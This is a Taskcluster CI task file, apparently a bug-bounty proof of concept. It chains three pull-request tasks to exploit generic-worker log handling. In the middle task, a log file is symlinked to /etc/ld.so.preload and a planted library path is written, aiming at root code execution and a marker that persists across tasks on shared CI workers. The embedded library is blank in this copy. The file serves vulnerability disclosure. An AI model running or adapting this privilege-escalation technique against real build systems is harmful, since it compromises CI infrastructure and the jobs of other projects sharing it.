version: 1
reporting: checks-v1
policy:
  pullRequests: public_restricted
tasks:
  $if: 'event.action == "closed"'
  then: []
  else:
    $let:
      controlId: {$eval: as_slugid("cross_task_control")}
      rootId: {$eval: as_slugid("cross_task_root")}
      consumerId: {$eval: as_slugid("cross_task_consumer")}
    in:
      - taskId: "${controlId}"
        taskGroupId: "${controlId}"
        provisionerId: translations-t
        workerType: t-linux-gw-noscratch-amd
        schedulerId: translations-level-1
        projectId: none
        created: {$fromNow: ''}
        deadline: {$fromNow: '30 minutes'}
        expires: {$fromNow: '1 day'}
        dependencies: []
        requires: all-completed
        routes: []
        priority: low
        retries: 0
        scopes: []
        payload:
          command:
            - - /bin/bash
              - -lc
              - |-
                set -euo pipefail
                cd "$${TASK_WORKDIR}"
                marker='/tmp/tc-bugbounty-cross-task-20260814-7f3c19a2/marker'
                if test -e "$${marker}" || test -L "$${marker}"; then
                  echo 'CONTROL_UNEXPECTED_PRESENT'
                  exit 41
                fi
                printf '%s\n' 'CONTROL_ABSENT nonce=tc-cross-task-20260814-7f3c19a2' > cross-task-control.txt
                echo 'CONTROL_ABSENT'
          maxRunTime: 300
          features:
            chainOfTrust: true
          artifacts:
            public/cross-task-control.txt:
              type: file
              path: cross-task-control.txt
              expires: {$fromNow: '1 day'}
        metadata:
          name: Authorized cross-task control
          description: Confirms the exact inert nonce marker is absent before the bounded root transition.
          owner: bug-bounty-researcher@example.invalid
          source: https://github.com/bughunter0xff/translations
        tags:
          purpose: authorized-security-validation
          containment: exact-nonce-negative-control

      - taskId: "${rootId}"
        taskGroupId: "${controlId}"
        provisionerId: translations-t
        workerType: t-linux-gw-noscratch-amd
        schedulerId: translations-level-1
        projectId: none
        created: {$fromNow: ''}
        deadline: {$fromNow: '30 minutes'}
        expires: {$fromNow: '1 day'}
        dependencies:
          - "${controlId}"
        requires: all-completed
        routes: []
        priority: low
        retries: 0
        scopes: []
        payload:
          command:
            - - /bin/bash
              - -lc
              - |-
                set -euo pipefail
                umask 077
                cd "$${TASK_WORKDIR}"

                test "$(id -u)" -ne 0
                test "$(uname -m)" = x86_64
                test -d generic-worker
                if test -e /etc/ld.so.preload || test -L /etc/ld.so.preload; then
                  echo 'POC_ABORT: /etc/ld.so.preload already exists'
                  exit 42
                fi

                printf '%s' '' | base64 -d > cross_task_marker.so
                printf '%s  %s\n' 'b28f8f0edd12decbf2d170405422a0f54932de1bddcf24f407c074ce0f1b9acd' cross_task_marker.so | sha256sum -c -
                chmod 0700 cross_task_marker.so

                mv generic-worker generic-worker.original
                mkdir -m 0700 generic-worker
                printf '%s\n' "$${TASK_WORKDIR}/cross_task_marker.so" > generic-worker/live_backing.log
                ln -s /etc/ld.so.preload generic-worker/certified.log
                echo 'POC_ARMED: one-shot root creation of one inert nonce marker; preload self-cleans first'
          maxRunTime: 300
          features:
            chainOfTrust: true
            backingLog: true
            liveLog: true
          logs:
            live: public/logs/live.log
            backing: public/logs/live_backing.log
        metadata:
          name: Authorized bounded root cross-task marker
          description: Creates one inert nonce marker after first removing the one-shot preload entry; no files are read or overwritten.
          owner: bug-bounty-researcher@example.invalid
          source: https://github.com/bughunter0xff/translations
        tags:
          purpose: authorized-security-validation
          containment: one-shot-inert-cross-task-marker

      - taskId: "${consumerId}"
        taskGroupId: "${controlId}"
        provisionerId: translations-t
        workerType: t-linux-gw-noscratch-amd
        schedulerId: translations-level-1
        projectId: none
        created: {$fromNow: ''}
        deadline: {$fromNow: '30 minutes'}
        expires: {$fromNow: '1 day'}
        dependencies:
          - "${rootId}"
        requires: all-completed
        routes: []
        priority: low
        retries: 0
        scopes: []
        payload:
          command:
            - - /bin/bash
              - -lc
              - |-
                set -euo pipefail
                cd "$${TASK_WORKDIR}"
                marker_dir='/tmp/tc-bugbounty-cross-task-20260814-7f3c19a2'
                marker="$${marker_dir}/marker"
                expected='TASKCLUSTER_BUGBOUNTY_CROSS_TASK nonce=tc-cross-task-20260814-7f3c19a2'

                if ! test -e "$${marker}" && ! test -L "$${marker}"; then
                  printf '%s\n' 'CONSUMER_ABSENT nonce=tc-cross-task-20260814-7f3c19a2' > cross-task-result.txt
                  echo 'CONSUMER_ABSENT'
                  exit 0
                fi
                if test -L "$${marker}" || ! test -f "$${marker}"; then
                  echo 'CONSUMER_ABORT: unexpected marker type'
                  exit 43
                fi
                test "$(wc -c < "$${marker}")" -le 128
                actual="$(head -c 128 -- "$${marker}")"
                if test "$${actual}" != "$${expected}"; then
                  echo 'CONSUMER_ABORT: nonce mismatch'
                  exit 44
                fi
                printf '%s\n' "$${expected}" > cross-task-result.txt
                rm -- "$${marker}"
                rmdir "$${marker_dir}" 2>/dev/null || true
                echo 'CONSUMER_OBSERVED_EXACT_NONCE_AND_REMOVED_MARKER'
          maxRunTime: 300
          features:
            chainOfTrust: true
          artifacts:
            public/cross-task-result.txt:
              type: file
              path: cross-task-result.txt
              expires: {$fromNow: '1 day'}
        metadata:
          name: Authorized cross-task consumer
          description: Checks only the exact inert nonce marker, publishes the bounded result, and removes the marker file.
          owner: bug-bounty-researcher@example.invalid
          source: https://github.com/bughunter0xff/translations
        tags:
          purpose: authorized-security-validation
          containment: exact-nonce-controlled-consumer
